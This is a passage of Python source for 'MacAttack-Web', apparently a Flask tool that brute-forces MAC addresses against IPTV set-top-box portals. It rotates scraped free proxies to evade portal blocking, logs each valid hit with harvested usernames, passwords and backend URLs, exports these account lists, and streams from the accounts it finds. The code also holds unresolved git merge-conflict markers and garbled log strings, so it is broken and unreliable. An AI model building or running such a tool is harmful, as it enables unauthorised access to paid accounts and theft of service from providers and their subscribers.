            except Exception as e:
                error_msg = str(e).lower()
                proxy_info = f" via {proxy}" if proxy else ""
                
                # Detect proxy errors
                is_proxy_error = any(x in error_msg for x in [
                    "timeout", "connection", "proxy", "socks", "403", "forbidden",
                    "refused", "unreachable", "reset", "closed", "ssl", "certificate",
                    "503", "502", "504", "rate", "limit", "banned", "blocked"
                ])
                
                if is_proxy_error and proxy:
                    mark_proxy_error(proxy, is_connection_error=True)
                    error_count = proxy_error_counts.get(proxy, 0)
                    
                    if error_count >= max_proxy_errors:
                        add_log(state, f"Ã°Å¸Å¡Â« Proxy disabled: {proxy}", "error")
                    else:
                        add_log(state, f"Ã¢Å¡  Proxy error ({error_count}/{max_proxy_errors}): {proxy}", "warning")
                    
                    mac_retry_counts[mac] += 1
                    working_proxies_left = [p for p in proxies if proxy_error_counts.get(p, 0) < max_proxy_errors]
                    
                    if unlimited_mac_retries:
                        if working_proxies_left:
                            retry_queue.append(mac)
                            add_log(state, f"Ã°Å¸ââ Retry {mac} (attempt {mac_retry_counts[mac]})", "info")
                        else:
                            state["tested"] += 1
                            state["errors"] += 1
                            add_log(state, f"Ã¢Åâ {mac} - All proxies exhausted", "error")
                            del mac_retry_counts[mac]
                    else:
                        if mac_retry_counts[mac] < max_mac_retries:
                            retry_queue.append(mac)
                            add_log(state, f"Ã°Å¸ââ Retry {mac} ({mac_retry_counts[mac]}/{max_mac_retries})", "info")
                        else:
                            state["tested"] += 1
                            state["errors"] += 1
                            add_log(state, f"Ã¢Åâ {mac} - Max retries reached", "error")
                            del mac_retry_counts[mac]
                else:
                    state["tested"] += 1
                    state["errors"] += 1
                    add_log(state, f"Ã¢Åâ Error: {mac} - {str(e)[:50]}", "error")
                    if mac in mac_retry_counts:
                        del mac_retry_counts[mac]
        
        time.sleep(0.05)
    
    state["running"] = False
    
    if proxies:
        failed_proxies = [p for p in proxies if proxy_error_counts.get(p, 0) >= max_proxy_errors]
        if failed_proxies:
            add_log(state, f"Ã¢Å¡  {len(failed_proxies)} proxies disabled", "warning")
=======
                    # Get proxy
                    proxy = None
                    if use_proxies:
                        proxy = proxy_manager.get_next_proxy()
                        if not proxy and not state["auto_paused"]:
                            # No proxy available, queue MAC for retry
                            if mac not in retry_queue:
                                retry_queue.append(mac)
                            break
                        state["current_proxy"] = proxy or ""
                    
                    state["current_mac"] = mac
                    
                    future = executor.submit(test_mac_worker, portal_url, mac, proxy, timeout)
                    futures[future] = (mac, proxy, is_retry)
            
            # Process completed futures
            done_futures = [f for f in futures if f.done()]
            
            for future in done_futures:
                mac, proxy, is_retry = futures.pop(future)
                
                # Release proxy connection
                if proxy:
                    proxy_manager.release_proxy(proxy)
                
                try:
                    success, result = future.result()
                    state["tested"] += 1
                    state["current_mac"] = mac
                    
                    proxy_info = f" via {proxy}" if proxy else ""
                    
                    if success:
                        state["hits"] += 1
                        
                        # Mark proxy success
                        if proxy:
                            proxy_manager.mark_success(proxy)
                        
                        expiry = result.get("expiry", "Unknown")
                        channels = result.get("channels", 0)
                        genres = result.get("genres", [])
                        
                        # Check for DE channels
                        de_channels = [g for g in genres if g.upper().startswith("DE") or "GERMAN" in g.upper() or "DEUTSCH" in g.upper()]
                        has_de = len(de_channels) > 0
                        
                        state["found_macs"].append({
                            "mac": mac,
                            "expiry": expiry,
                            "channels": channels,
                            "has_de": has_de,
                            "time": datetime.now().strftime("%H:%M:%S")
                        })
                        
                        de_info = " 🇩🇪" if has_de else ""
                        add_log(state, f"🎯 HIT! {mac} - Expiry: {expiry} - Channels: {channels}{de_info}{proxy_info}", "success")
                        
                        # Save to config
                        found_entry = {
                            "mac": mac,
                            "expiry": expiry,
                            "portal": portal_url,
                            "channels": channels,
                            "genres": genres,
                            "has_de": has_de,
                            "de_genres": de_channels,
                            "vod_categories": result.get("vod_categories", []),
                            "series_categories": result.get("series_categories", []),
                            "backend_url": result.get("backend_url"),
                            "username": result.get("username"),
                            "password": result.get("password"),
                            "max_connections": result.get("max_connections"),
                            "created_at": result.get("created_at"),
                            "client_ip": result.get("client_ip"),
                            "found_at": datetime.now().isoformat()
                        }
                        
                        # Update or add
                        existing_idx = None
                        for idx, existing in enumerate(config["found_macs"]):
                            if existing.get("mac") == mac and existing.get("portal") == portal_url:
                                existing_idx = idx
                                break
                        
                        if existing_idx is not None:
                            config["found_macs"][existing_idx] = found_entry
                        else:
                            config["found_macs"].append(found_entry)
                        
                        if settings.get("auto_save", True):
                            save_config()
                        
                        # Clear retry count
                        mac_retry_counts.pop(mac, None)
                    else:
                        add_log(state, f"✗ {mac} - No valid account{proxy_info}", "info")
                        mac_retry_counts.pop(mac, None)
                
                except (stb.ProxyDeadError, stb.PortalBlockedError, stb.ProxyError) as e:
                    error_type = type(e).__name__
                    proxy_info = f" via {proxy}" if proxy else ""
                    
                    # Classify and handle proxy error
                    if isinstance(e, stb.ProxyDeadError):
                        status = proxy_manager.mark_error(proxy, is_dead=True)
                        add_log(state, f"💀 Proxy dead: {proxy}", "error")
                    elif isinstance(e, stb.PortalBlockedError):
                        status = proxy_manager.mark_error(proxy, is_blocked=True)
                        add_log(state, f"🚫 Proxy blocked by portal: {proxy}", "error")
                    else:
                        status = proxy_manager.mark_error(proxy)
                        error_count = proxy_manager.error_counts.get(proxy, 0)
                        add_log(state, f"⚠ Proxy error ({error_count}/{max_proxy_errors}): {proxy}", "warning")
                    
                    # Retry MAC with different proxy
                    mac_retry_counts[mac] += 1
                    
                    if unlimited_mac_retries:
                        if proxy_manager.has_working_proxies():
                            retry_queue.append(mac)
                            add_log(state, f"🔄 Queuing {mac} for retry (attempt {mac_retry_counts[mac]})", "info")
                        else:
                            state["errors"] += 1
                            add_log(state, f"✗ {mac} - All proxies exhausted", "error")
                            mac_retry_counts.pop(mac, None)
                    else:
                        if mac_retry_counts[mac] < max_mac_retries:
                            retry_queue.append(mac)
                            add_log(state, f"🔄 Queuing {mac} for retry ({mac_retry_counts[mac]}/{max_mac_retries})", "info")
                        else:
                            state["errors"] += 1
                            add_log(state, f"✗ {mac} - Max retries reached", "error")
                            mac_retry_counts.pop(mac, None)
                
                except Exception as e:
                    state["errors"] += 1
                    proxy_info = f" via {proxy}" if proxy else ""
                    add_log(state, f"✗ Error: {mac} - {str(e)[:50]}{proxy_info}", "error")
                    mac_retry_counts.pop(mac, None)
            
            time.sleep(0.05)
    
    state["running"] = False
    
    # Final stats
    if use_proxies:
        stats = proxy_manager.get_stats()
        state["proxy_stats"] = stats
        add_log(state, f"Proxy stats: {stats['active']} active, {stats['blocked']} blocked, {stats['dead']} dead, {stats['disabled']} disabled", "info")
>>>>>>> Stashed changes
    
    add_log(state, f"Ã¢Åâ Finished. Tested: {state['tested']}, Hits: {state['hits']}, Errors: {state['errors']}", "success")


def test_mac_worker(portal_url, mac, proxy, timeout):
<<<<<<< Updated upstream
    """Worker using optimized stb.test_mac_full() with settings."""
    settings = get_settings()
    max_retries = settings.get("session_max_retries", 0)
    return stb.test_mac_full(portal_url, mac, proxy, timeout, max_retries=max_retries)
=======
    """Test MAC using quick scan + full scan."""
    return stb.test_mac_full(portal_url, mac, proxy, timeout)
>>>>>>> Stashed changes



# ============== PROXY ROUTES ==============

@app.route("/api/proxies", methods=["GET", "POST", "DELETE"])
@requires_auth
def api_proxies():
    if request.method == "GET":
        return jsonify({
            "proxies": config.get("proxies", []),
            "state": proxy_state,
            "error_counts": dict(proxy_error_counts)
        })
    
    if request.method == "POST":
        data = request.json
        proxies = data.get("proxies", "").strip().split("\n")
        proxies = [p.strip() for p in proxies if p.strip()]
        seen = set()
        unique_proxies = []
        for p in proxies:
            if p not in seen:
                seen.add(p)
                unique_proxies.append(p)
        config["proxies"] = unique_proxies
        save_config()
        return jsonify({"success": True, "count": len(unique_proxies)})
    
    if request.method == "DELETE":
        config["proxies"] = []
        proxy_error_counts.clear()
        save_config()
        return jsonify({"success": True})


@app.route("/api/proxies/sources", methods=["GET", "POST"])
@requires_auth
def api_proxy_sources():
    if request.method == "GET":
        return jsonify({"sources": config.get("proxy_sources", DEFAULT_PROXY_SOURCES)})
    
    if request.method == "POST":
        data = request.json
        sources = data.get("sources", [])
        if isinstance(sources, str):
            sources = [s.strip() for s in sources.split("\n") if s.strip()]
        config["proxy_sources"] = sources
        save_config()
        return jsonify({"success": True, "count": len(sources)})


@app.route("/api/proxies/fetch", methods=["POST"])
@requires_auth
def api_proxies_fetch():
    global proxy_state
    
    if proxy_state["fetching"]:
        return jsonify({"success": False, "error": "Already fetching"})
    
    proxy_state["fetching"] = True
    proxy_state["logs"] = []
    
    thread = threading.Thread(target=fetch_proxies_worker, daemon=True)
    thread.start()
    
    return jsonify({"success": True})


@app.route("/api/proxies/test", methods=["POST"])
@requires_auth
def api_proxies_test():
    global proxy_state
    
    if proxy_state["testing"]:
        return jsonify({"success": False, "error": "Already testing"})
    
    proxy_state["testing"] = True
    proxy_state["logs"] = []
    
    thread = threading.Thread(target=test_proxies_worker, daemon=True)
    thread.start()
    
    return jsonify({"success": True})


@app.route("/api/proxies/status")
@requires_auth
def api_proxies_status():
    return jsonify(proxy_state)


@app.route("/api/proxies/reset-errors", methods=["POST"])
@requires_auth
def api_proxies_reset_errors():
    global proxy_error_counts
    proxy_error_counts.clear()
    return jsonify({"success": True})


@app.route("/api/proxies/remove-failed", methods=["POST"])
@requires_auth
def api_proxies_remove_failed():
    failed = proxy_state.get("failed_proxies", [])
    if not failed:
        return jsonify({"success": False, "error": "No failed proxies to remove. Run 'Test Proxies' first."})
    
    failed_set = set(failed)
    current = config.get("proxies", [])
    remaining = [p for p in current if p not in failed_set]
    
    removed_count = len(current) - len(remaining)
    config["proxies"] = remaining
    proxy_state["failed_proxies"] = []
    proxy_state["proxies"] = remaining
    save_config()
    
    return jsonify({"success": True, "removed": removed_count, "remaining": len(remaining)})


@app.route("/api/proxies/test-autodetect", methods=["POST"])
@requires_auth
def api_proxies_test_autodetect():
    global proxy_state
    
    if proxy_state["testing"]:
        return jsonify({"success": False, "error": "Already testing"})
    
    proxy_state["testing"] = True
    proxy_state["logs"] = []
    
    thread = threading.Thread(target=test_proxies_autodetect_worker, daemon=True)
    thread.start()
    
    return jsonify({"success": True})


def fetch_proxies_worker():
    global proxy_state
    
    sources = config.get("proxy_sources", DEFAULT_PROXY_SOURCES)
    all_proxies = []
    
    add_log(proxy_state, f"Fetching proxies from {len(sources)} sources...", "info")
    
    for source in sources:
        try:
            add_log(proxy_state, f"Fetching from {source}", "info")
            with no_proxy_environment():
                response = requests.get(source, timeout=15)
                
                if "spys.me" in source:
                    matches = re.findall(r"[0-9]+(?:\.[0-9]+){3}:[0-9]+", response.text)
                    all_proxies.extend(matches)
                elif "freeproxy.world" in source:
                    matches = re.findall(
                        r'<td class="show-ip-div">\s*(\d+\.\d+\.\d+\.\d+)\s*</td>\s*'
                        r'<td>\s*<a href=".*?">(\d+)</a>\s*</td>',
                        response.text
                    )
                    all_proxies.extend([f"{ip}:{port}" for ip, port in matches])
                else:
                    matches = re.findall(r"<td>(\d+\.\d+\.\d+\.\d+)</td><td>(\d+)</td>", response.text)
                    if matches:
                        all_proxies.extend([f"{ip}:{port}" for ip, port in matches])
                    else:
                        prefixed = re.findall(r"((?:socks[45]|http)://[^\s<>\"']+)", response.text, re.IGNORECASE)
                        if prefixed:
                            all_proxies.extend(prefixed)
                        plain = re.findall(r"(\d+\.\d+\.\d+\.\d+:\d+)", response.text)
                        all_proxies.extend(plain)
                
                add_log(proxy_state, f"Found proxies from {source}", "info")
        except Exception as e:
            add_log(proxy_state, f"Error fetching from {source}: {e}", "error")
    
    all_proxies = list(set(all_proxies))
    proxy_state["proxies"] = all_proxies
    
    add_log(proxy_state, f"Total unique proxies: {len(all_proxies)}. Use 'Test & Auto-Detect' to verify.", "success")
    proxy_state["fetching"] = False


def test_proxies_worker():
    global proxy_state
    
    proxies = config.get("proxies", [])
    if not proxies:
        proxies = proxy_state.get("proxies", [])
    
    if not proxies:
        add_log(proxy_state, "No proxies to test", "warning")
        proxy_state["testing"] = False
        return
    
    working = []
    failed = []
    test_threads = get_settings().get("proxy_test_threads", 50)
    add_log(proxy_state, f"Testing {len(proxies)} proxies with {test_threads} threads...", "info")
    
    def test_proxy(proxy):
        try:
            with no_proxy_environment():
                proxy_dict = stb.parse_proxy(proxy)
                response = requests.get("http://httpbin.org/ip", proxies=proxy_dict, timeout=10)
                if response.status_code == 200:
                    return proxy, True
        except:
            pass
        return proxy, False
    
    with ThreadPoolExecutor(max_workers=test_threads) as executor:
        futures = {executor.submit(test_proxy, p): p for p in proxies}
        
        for future in as_completed(futures):
            proxy, is_working = future.result()
            if is_working:
                working.append(proxy)
                add_log(proxy_state, f"â {proxy}", "success")
            else:
                failed.append(proxy)
                add_log(proxy_state, f"â {proxy}", "error")
    
    proxy_state["working_proxies"] = working
    proxy_state["failed_proxies"] = failed
    proxy_state["proxies"] = proxies
    
    add_log(proxy_state, f"Done! {len(working)}/{len(proxies)} working.", "success")
    proxy_state["testing"] = False


def test_proxies_autodetect_worker():
    global proxy_state
    
    proxies = config.get("proxies", [])
    if not proxies:
        proxies = proxy_state.get("proxies", [])
    
    if not proxies:
        add_log(proxy_state, "No proxies to test", "warning")
        proxy_state["testing"] = False
        return
    
    result_proxies = []
    failed = []
    test_threads = get_settings().get("proxy_test_threads", 50)
    add_log(proxy_state, f"Testing {len(proxies)} proxies with {test_threads} threads (HTTP â SOCKS5 â SOCKS4)...", "info")
    
    def test_proxy_autodetect(proxy):
        original_proxy = proxy
        base_proxy = proxy
        auth_part = ""
        
        if proxy.startswith("socks5://"):
            base_proxy = proxy[9:]
        elif proxy.startswith("socks4://"):
            base_proxy = proxy[9:]
        elif proxy.startswith("http://"):
            base_proxy = proxy[7:]
        
        if "@" in base_proxy:
            auth_part, base_proxy = base_proxy.rsplit("@", 1)
            auth_part = auth_part + "@"
        
        test_configs = []
        if auth_part:
            test_configs.append((f"http://{auth_part}{base_proxy}", "HTTP", f"http://{auth_part}{base_proxy}"))
        test_configs.append((base_proxy, "HTTP", base_proxy))
        test_configs.append((f"socks5://{auth_part}{base_proxy}", "SOCKS5", f"socks5://{auth_part}{base_proxy}"))
        test_configs.append((f"socks4://{base_proxy}", "SOCKS4", f"socks4://{base_proxy}"))
        
        for test_proxy_str, proxy_type, result_proxy in test_configs:
            try:
                with no_proxy_environment():
                    proxy_dict = stb.parse_proxy(test_proxy_str)
                    response = requests.get("http://httpbin.org/ip", proxies=proxy_dict, timeout=10)
                    if response.status_code == 200:
                        return original_proxy, result_proxy, proxy_type, True
            except:
                pass
        
        return original_proxy, original_proxy, "NONE", False
    
    with ThreadPoolExecutor(max_workers=test_threads) as executor:
        futures = {executor.submit(test_proxy_autodetect, p): p for p in proxies}
        
        for future in as_completed(futures):
            original, detected, proxy_type, is_working = future.result()
            if is_working:
                result_proxies.append(detected)
                if original != detected:
                    add_log(proxy_state, f"â {original} â {detected} ({proxy_type})", "success")
                else:
                    add_log(proxy_state, f"â {detected} ({proxy_type})", "success")
            else:
                failed.append(original)
<<<<<<< Updated upstream
                add_log(proxy_state, f"â {original} (no working type found)", "error")
=======
                add_log(proxy_state, f"✗ {original}", "error")
>>>>>>> Stashed changes
    
    proxy_state["working_proxies"] = result_proxies
    proxy_state["failed_proxies"] = failed
    proxy_state["proxies"] = result_proxies + failed
    
    config["proxies"] = result_proxies + failed
    save_config()
    
    add_log(proxy_state, f"Done! {len(result_proxies)}/{len(proxies)} working. Types auto-detected.", "success")
    proxy_state["testing"] = False



# ============== PLAYER ROUTES ==============

@app.route("/api/player/connect", methods=["POST"])
@requires_auth
def api_player_connect():
    data = request.json
    url = data.get("url", "").strip()
    mac = data.get("mac", "").strip().upper()
    proxy = data.get("proxy", "").strip() or None
    
    if not url or not mac:
        return jsonify({"success": False, "error": "URL and MAC required"})
    
    if not url.startswith("http"):
        url = f"http://{url}"
    
    try:
        token, token_random, portal_type, portal_version = stb.get_token(url, mac, proxy)
        
        if not token:
            return jsonify({"success": False, "error": "Failed to get token"})
        
        genres = stb.get_genres(url, mac, token, portal_type, token_random, proxy)
        vod_cats = stb.get_vod_categories(url, mac, token, portal_type, token_random, proxy)
        series_cats = stb.get_series_categories(url, mac, token, portal_type, token_random, proxy)
        
        return jsonify({
            "success": True,
            "token": token,
            "token_random": token_random,
            "portal_type": portal_type,
            "live": [{"id": g["id"], "name": g["title"]} for g in genres],
            "vod": [{"id": c["id"], "name": c["title"]} for c in vod_cats],
            "series": [{"id": c["id"], "name": c["title"]} for c in series_cats]
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})


@app.route("/api/player/channels", methods=["POST"])
@requires_auth
def api_player_channels():
    data = request.json
    url = data.get("url", "").strip()
    mac = data.get("mac", "").strip().upper()
    token = data.get("token", "")
    token_random = data.get("token_random")
    portal_type = data.get("portal_type", "portal.php")
    category_type = data.get("category_type", "IPTV")
    category_id = data.get("category_id", "")
    proxy = data.get("proxy", "").strip() or None
    
    try:
        channels, total = stb.get_channels(url, mac, token, portal_type, category_type, category_id, token_random, proxy)
        return jsonify({"success": True, "channels": channels, "total": total})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})


@app.route("/api/player/stream", methods=["POST"])
@requires_auth
def api_player_stream():
    data = request.json
    url = data.get("url", "").strip()
    mac = data.get("mac", "").strip().upper()
    token = data.get("token", "")
    token_random = data.get("token_random")
    portal_type = data.get("portal_type", "portal.php")
    cmd = data.get("cmd", "")
    content_type = data.get("content_type", "live")
    proxy = data.get("proxy", "").strip() or None
    
    try:
        if content_type == "vod":
            stream_url = stb.get_vod_stream_url(url, mac, token, portal_type, cmd, token_random, proxy)
        else:
            stream_url = stb.get_stream_url(url, mac, token, portal_type, cmd, token_random, proxy)
        
        if stream_url:
            return jsonify({"success": True, "stream_url": stream_url})
        else:
            return jsonify({"success": False, "error": "Failed to get stream URL"})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})


# ============== FOUND MACS ==============

@app.route("/api/found", methods=["GET", "DELETE"])
@requires_auth
def api_found():
    if request.method == "GET":
        return jsonify(config.get("found_macs", []))
    
    if request.method == "DELETE":
        config["found_macs"] = []
        save_config()
        return jsonify({"success": True})


@app.route("/api/found/export")
@requires_auth
def api_found_export():
    format_type = request.args.get("format", "txt")
    found = config.get("found_macs", [])
    
    if format_type == "json":
        return Response(
            json.dumps(found, indent=2),
            mimetype="application/json",
            headers={"Content-Disposition": "attachment;filename=found_macs.json"}
        )
    else:
        lines = []
        for m in found:
            line = f"{'Portal:':<10} {m.get('portal', 'N/A')}\n"
            line += f"{'MAC:':<10} {m['mac']}\n"
            
            if m.get('username') and m.get('password'):
                line += f"{'Username:':<10} {m.get('username')}\n"
                line += f"{'Password:':<10} {m.get('password')}\n"
            
            if m.get('max_connections'):
                line += f"{'Max Conn:':<10} {m.get('max_connections')}\n"
            
            line += f"{'Found on:':<10} {m.get('found_at', 'N/A')}\n"
            
            if m.get('created_at'):
                line += f"{'Creation:':<10} {m.get('created_at')}\n"
            
            line += f"{'Exp date:':<10} {m.get('expiry', 'N/A')}\n"
            line += f"{'Channels:':<10} {m.get('channels', 0)}\n"
            
            if m.get('genres'):
                line += f"{'Playlist:':<10} {', '.join(m.get('genres', []))}\n"
            
            if m.get('vod_categories'):
                line += f"{'VOD list:':<10} {', '.join(m.get('vod_categories', []))}\n"
            
            line += "\n" + "="*50 + "\n"
            lines.append(line)
        
        return Response(
            "\n".join(lines),
            mimetype="text/plain",
            headers={"Content-Disposition": "attachment;filename=found_macs.txt"}
        )


# ============== MAIN ==============

if __name__ == "__main__":
    load_config()
    logger.info(f"MacAttack-Web v{VERSION} starting...")
    
    host_parts = host.split(":")
    bind_host = host_parts[0]
    bind_port = int(host_parts[1]) if len(host_parts) > 1 else 5002
    
    logger.info(f"Server running on http://{bind_host}:{bind_port}")
    waitress.serve(app, host=bind_host, port=bind_port)
